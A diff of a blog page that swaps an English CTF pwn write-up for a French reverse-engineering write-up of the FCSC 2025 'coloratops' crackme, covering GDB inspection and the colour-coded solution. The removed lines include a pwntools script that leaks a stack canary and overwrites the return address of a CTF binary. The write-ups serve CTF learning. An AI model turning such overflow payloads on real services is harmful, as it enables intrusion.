 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ((<span style="color:#bd93f9">0x3b</span> <span style="color:#ff79c6">&lt;</span> elapsedSeconds) <span style="color:#ff79c6">&amp;&amp;</span> (hasTimedOut <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)) {
-</span></span><span style="display:flex;"><span>hasTimedOut <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>	hasTimedOut <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>![[breaking_the_timer.jpg]]</p>
+</span></span></code></pre></div><p><img src="https://i.ibb.co/9mNsfQhf/breaking-the-timer.jpg" alt="breaking_the_timer.jpg"></p>
 <h3 id="changements-dimage-de-fond">Changements d&rsquo;image de fond</h3>
 <p>On remarque qu&rsquo;en fonction de certains évènements, l&rsquo;image de fond de l&rsquo;application va changer, notamment quand le programme n&rsquo;a <em>pas timeout</em> mais que <em>l&rsquo;entrée n&rsquo;est pas correcte</em>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (hasTimedOut <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
@@ -326,7 +342,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><p>Il affiche ensuite l&rsquo;icône pour la musique ainsi que le temps restant, mais ça ne nous intéresse pas vraiment pour ce challenge.</p>
 <h2 id="checkflagvalidity">checkFlagValidity()</h2>
-<p>On va maintenant se pencher sur la fonction que vérifie le flag, puisque c&rsquo;est elle qui va nous permettre de comprendre comment avoir une entrée valide.</p>
+<p>On va maintenant se pencher sur la fonction qui vérifie le flag, puisque c&rsquo;est elle qui va nous permettre de comprendre comment avoir une entrée valide.</p>
 <p>La manière dont il vérifie le flag est intéressante, on comprend assez vite le nom du challenge <code>coloratops</code>.</p>
 <p>Le programme prépare une surface RGB qui va être utilisée pour lire un caractère de l&rsquo;input:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rectX <span style="color:#ff79c6">=</span> signatureIndex <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x11</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3c</span>;
@@ -352,7 +368,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span><span style="display:flex;"><span>	} 
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>extractedSignatures[signatureIndex] <span style="color:#ff79c6">=</span> decodedSignature;
-</span></span></code></pre></div><p>Enfin, il vérifie si le tableau de signatures et correct en le comparant à un tableau qui contient les signatures valides (<code>expectedSignatures</code>):</p>
+</span></span></code></pre></div><p>Enfin, il vérifie si le tableau de signatures est correct en le comparant à un tableau qui contient les signatures valides (<code>expectedSignatures</code>):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#bd93f9">0x3f</span> <span style="color:#ff79c6">&lt;</span> signatureIndex) {
 </span></span><span style="display:flex;"><span>  isValid <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (compareIndex <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; compareIndex <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x40</span>; compareIndex <span style="color:#ff79c6">=</span> compareIndex <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) {
@@ -362,13 +378,13 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> isValid;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="récupérer-les-signatures-valides">Récupérer les signatures valides</h2>
-<p>Maintenant, il faut récupérer le tableau de signatures valides. Pour ce faire, on va débugger le programme et inspecter la variable au moment de la comparaison.</p>
+<p>Maintenant, il faut récupérer le tableau de signatures valides. Pour ce faire, on va déboguer le programme et inspecter la variable au moment de la comparaison.</p>
 <p>On va d&rsquo;abord s&rsquo;arrêter à l&rsquo;appel de <code>checkFlagValidity()</code>. Vu que le programme est <strong>strippé</strong>, on ne peut pas directement mettre le breakpoint avec le nom de la fonction, il faut chercher son appel en regardant le comportement de <code>main()</code>.</p>
 <p><code>checkFlagValidity()</code> -&gt; <code>0x55555555dc77</code></p>
 <p>On voit ces instructions qui sont plutôt intéressantes:
-![[2025-04-27-173526_755x281_scrot.png]]</p>
-<p>On peut aller à l&rsquo;instruction suivante et inspécter le contenu de <code>rax</code> pour voir notre tableau <code>expectedSignatures</code>:</p>
-<p>![[2025-04-27-173958_425x381_scrot.png]]</p>
+<img src="https://i.ibb.co/PZs4DHHW/2025-04-27-173526-755x281-scrot.png" alt="2025-04-27-173526_755x281_scrot.png"></p>
+<p>On peut aller à l&rsquo;instruction suivante et inspecter le contenu de <code>rax</code> pour voir notre tableau <code>expectedSignatures</code>:</p>
+<p><img src="https://i.ibb.co/gLmq2YfF/2025-04-27-173958-425x381-scrot.png" alt="2025-04-27-173958_425x381_scrot.png"></p>
 <p>Et le transformer en une liste, ça sera utile pour plus tard:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,   <span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">9</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">3</span>,   <span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">5</span>,   <span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">2</span>,
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">9</span>,   <span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">5</span>,   <span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">8</span>,   <span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">8</span>,
@@ -395,11 +411,11 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span></code></pre></div><p>Cette fonction va parcourir un tableau et retourner l&rsquo;indice quand les couleurs correspondent.</p>
 <p>On comprend donc notre tableau précédent, c&rsquo;est un tableau d&rsquo;indices !</p>
 <p>Il faut donc savoir à quelle couleur correspond chaque indice. On va pouvoir faire ça avec GDB, sauf qu&rsquo;une fois de plus le programme est <strong>strippé</strong> donc on ne peut pas juste mettre un <em>breakpoint</em> sur la fonction.</p>
-<p>![[2025-04-27-180202_746x879_scrot.png]]</p>
+<p><img src="https://i.ibb.co/PGpGL06v/2025-04-27-180202-746x879-scrot.png" alt="2025-04-27-180202_746x879_scrot.png"></p>
 <p>On voit une instruction <code>call 0x55555555dc32</code> et la fonction à <code>0x55555555dc32</code> semble être notre <code>decodePixelSignature</code>.</p>
-<p>La ligne <code>0x55555555dc4f:	lea    rax,[rip+0x18ca]        # 0x55555555f520</code> est intéressante car c&rsquo;est sûrement l&rsquo;adresse du tableau qui contient les couleurs. Essayons d&rsquo;inspecter sa valeur:</p>
-<p>![[2025-04-27-180603_764x88_scrot.png]]</p>
-<p>Et ces valeurs sont très cohérentes, puisque <code>0xffffffff</code> est le code héxadécimal pour du <em>blanc</em>.</p>
+<p>La ligne <code>0x55555555dc4f: lea rax,[rip+0x18ca] # 0x55555555f520</code> est intéressante car c&rsquo;est sûrement l&rsquo;adresse du tableau qui contient les couleurs. Essayons d&rsquo;inspecter sa valeur:</p>
+<p><img src="https://i.ibb.co/7mRnDR2/2025-04-27-180603-764x88-scrot.png" alt="2025-04-27-180603_764x88_scrot.png"></p>
+<p>Et ces valeurs sont très cohérentes, puisque <code>0xffffffff</code> est le code hexadécimal pour du <em>blanc</em>.</p>
 <table>
   <thead>
       <tr>
@@ -461,62 +477,29 @@ Identification des fonctions principales et nommage Après avoir identifié la f
       </tr>
   </tbody>
 </table>
-<p>![[2025-03-23-005956_518x449_scrot.png]]</p>
-<p>So we&rsquo;ll jump to the address of this function, which is static because PIE isn&rsquo;t enabled.</p>
-<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
-<ol>
-<li>Fill the first input buffer so it leaks values from the stack</li>
-<li>Parse the output to extract the value of the stack canary</li>
-<li>Craft a payload that will overwrite RIP with <code>duck_attack()</code>&rsquo;s address, without triggering the stack smashing detector</li>
-</ol>
-<h2 id="solve-script">Solve Script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>update(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;x86_64&#39;</span>)
-</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf <span style="color:#ff79c6">=</span> exe <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./quack_quack&#34;</span>)
-</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>REMOTE:
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;94.237.57.171&#34;</span>, <span style="color:#bd93f9">51170</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;./quack_quack&#34;</span>)
-</span></span><span style="display:flex;"><span>        gdb<span style="color:#ff79c6">.</span>attach(r)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io <span style="color:#ff79c6">=</span> start()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =============================================================================</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>first_payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&#34;</span>, first_payload)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;,&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>adresses <span style="color:#ff79c6">=</span> leak<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Quack Quack &#34;</span>)[<span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;,&#34;</span>)[<span style="color:#bd93f9">0</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>canary_bytes <span style="color:#ff79c6">=</span> adresses[:<span style="color:#bd93f9">7</span>]
-</span></span><span style="display:flex;"><span>canary <span style="color:#ff79c6">=</span> canary_bytes<span style="color:#ff79c6">.</span>rjust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
-</span></span><span style="display:flex;"><span>canary <span style="color:#ff79c6">=</span> u64(canary)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#34;canary value = &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(canary))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>second_payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">88</span> <span style="color:#ff79c6">+</span> p64(canary) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#34;duck_attack&#34;</span>])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&#34;</span>, second_payload)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =============================================================================</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>interactive()
-</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
-<p>This was a fun challenge even though it was a standard stack canary bypass. It&rsquo;s always good to review acquired knowledge.</p>
+<h2 id="solution-colorée">Solution colorée</h2>
+<p>Si on utilise ce tableau de correspondances des couleurs, on aura les couleurs du flag:</p>
+<p><code>⬜⬜⬜⬜⬜🔵🟢🟠🟢🟢🟢🟡🟢🟠🟢🟣🟢🟢🟣🔵🟢🟢🟢🟡🔴🟢🟣🟣🟠🟠🟢🟣🟡🟠🔵🟣🔵🔴🟣🟢🔴🔴🟠🟠🟣🟡🟠🟣🟢🔴🟢🟢🟠🔵🔴🔵🟡🟠🟠🔵🔵🔵🟠⬜</code></p>
+<p>On remarque quelque chose de très intéressant: <strong>les 5 premiers caractères sont blancs</strong>, si on teste ça dans le programme, cette contrainte est déjà respectée:</p>
+<p><img src="https://i.ibb.co/217tjyVQ/2025-04-27-181716-1187x676-scrot.png" alt="2025-04-27-181716_1187x676_scrot.png"></p>
+<p>Trouver le flag revient donc à <em>trouver l&rsquo;entrée qui aura les couleurs correspondantes à notre tableau</em>.</p>
+<p>Deux options s&rsquo;offrent à nous:</p>
+<p><img src="https://i.ibb.co/990f1pHm/bruteforce-ou-script.jpg" alt="bruteforce_ou_script.jpg"></p>
+<p>Puisque <em>la couleur d&rsquo;un caractère dépend du caractère suivant</em>, on peut commencer par la fin du flag et remonter au fur et à mesure jusqu&rsquo;au début du flag. Par exemple, le seul caractère qui fait une accolade fermée blanche est la lettre <em>d</em>. On sait donc que le dernier caractère du flag est <em>d</em>.</p>
+<p><img src="https://i.ibb.co/pv6YDpkN/2025-04-27-182348-1169x141-scrot.png" alt="2025-04-27-182348_1169x141_scrot.png"></p>
+<p>Pour vérifier notre input on peut mettre un breakpoint à <code>0x55555555dde1</code>, juste avant que le programme commence à comparer les signatures dans <code>checkFlagValidity()</code>.</p>
+<p>Ensuite, on inspecte notre input comme ceci:</p>
+<p><img src="https://i.ibb.co/Q3SpCRMc/2025-04-27-182943-779x206-scrot.png" alt="2025-04-27-182943_779x206_scrot.png"></p>
+<p>À la fin, on a <code>0x03</code> puis <code>0x00</code>. Si on reprend notre tableau <code>expectedSignatures</code>, on voit que les quatre dernières valeurs sont <code>[9,9,3,0]</code>. On retrouve bien notre <code>3</code> suivi de notre <code>0</code>.</p>
+<h2 id="résolution">Résolution</h2>
+<p>Après environ une heure et demie à tester les couleurs et à ne pas faire la différence entre le orange corail, le orange doré et le jaune, on trouve enfin la bonne entrée:</p>
+<p><img src="https://i.ibb.co/b569TXYC/2025-04-27-183435-1194x677-scrot.png" alt="2025-04-27-183435_1194x677_scrot.png"></p>
+<p><code>⬜⬜⬜⬜⬜🔵🟢🟠🟢🟢🟢🟡🟢🟠🟢🟣🟢🟢🟣🔵🟢🟢🟢🟡🔴🟢🟣🟣🟠🟠🟢🟣🟡🟠🔵🟣🔵🔴🟣🟢🔴🔴🟠🟠🟣🟡🟠🟣🟢🔴🟢🟢🟠🔵🔴🔵🟡🟠🟠🔵🔵🔵🟠⬜</code></p>
+<p>Si on plisse les yeux, on voit que notre représentation colorée était plutôt fidèle (à quelques détails près) !</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>J&rsquo;ai adoré ce challenge ! En tant que débutant en reverse, j&rsquo;ai appris beaucoup de choses et la touche colorée a rendu la résolution vraiment sympa.</p>
+<p><img src="https://i.ibb.co/C5YxYhpy/solving.gif" alt="solving.gif"></p>
+<h4 id="back-to-top"><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#sommaire">back to top</a></h4>
 
       </div>
     </article>
@@ -525,6 +508,15 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
     <div class="post-info">
       
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/reverse/">reverse</a></span>
+        <span class="tag"><a href="/tags/gdb/">gdb</a></span>
+        <span class="tag"><a href="/tags/crackme/">crackme</a></span>
+        
+    </p>
+
       
 
       <p>
@@ -535,7 +527,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1500 Words
+        1616 Words
       </p>
 
       <p>
@@ -546,16 +538,18 @@ Identification des fonctions principales et nommage Après avoir identifié la f
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
         
-          0001-01-01 00:09
+          2025-27-04 02:00
         
 
+         
+          
         
       </p>
     </div>
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -563,7 +557,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -572,7 +566,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=&amp;caption=&amp;canonicalUrl=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;caption=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;canonicalUrl=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -581,7 +575,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=&amp;body=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;body=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -589,7 +583,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f&amp;media=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f;description=" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f&amp;media=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f;description=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -597,7 +591,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f&amp;title=&amp;summary=&amp;source=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;summary=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;source=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -605,7 +599,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f&amp;resubmit=true&amp;title=" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f&amp;resubmit=true&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
